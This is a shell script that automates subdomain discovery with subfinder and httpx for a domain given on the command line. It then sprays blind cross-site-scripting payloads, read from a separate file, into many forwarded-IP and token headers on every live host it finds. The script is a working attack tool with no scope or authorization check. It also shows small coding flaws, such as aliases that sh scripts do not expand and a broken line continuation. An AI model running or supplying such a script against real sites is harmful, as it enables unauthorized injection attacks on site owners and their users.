#!/bin/sh
#install subfinder
docker pull projectdiscovery/subfinder
sleep 1

#alias subfinder
alias subfinder='docker run -it --rm -w /data -v $(pwd):/data projectdiscovery/subfinder'
sleep 1

#install httpx
docker pull projectdiscovery/httpx
sleep 1

#alias httpx
alias httpx='docker run -it --rm -w /data -v $(pwd):/data projectdiscovery/httpx'

sleep 1

echo "subfinder & httpx  successfully installs "


#enumeration subdomain
subfinder -d $1 -silent >> $1subdomain.txt
 sleep 1

wc -l <  $1subdomain.txt 
 echo "enumeration subdomain  successfully  " 
sleep 1

#subdomain live

httpx -l $1subdomain.txt >> $1LIVE.txt

wc -l < $1LIVE.txt 

 echo " subdomainlive   successfully  " 

sleep 1

#blindxss

while read bxss;
do  httpx -l $1LIVE.txt  -H "X-Forwarded-for: $bxss" -H "X-forwarded-ip: $bxss" -H "cf-connecting-ip: $bxss" 
sleep 1
httpx -l $1LIVE.txt  -H "X-Client-ip: $bxss" -H "X-real-ip: $bxss" -H "X-request-uri: $bxss" \  -H "X-XSRF-TOKEN: $bxss" -H "X-CSRF-TOKEN: $bxss" 
done < bxss-payload.txt

 echo " BLIND XSS  successfully  " 
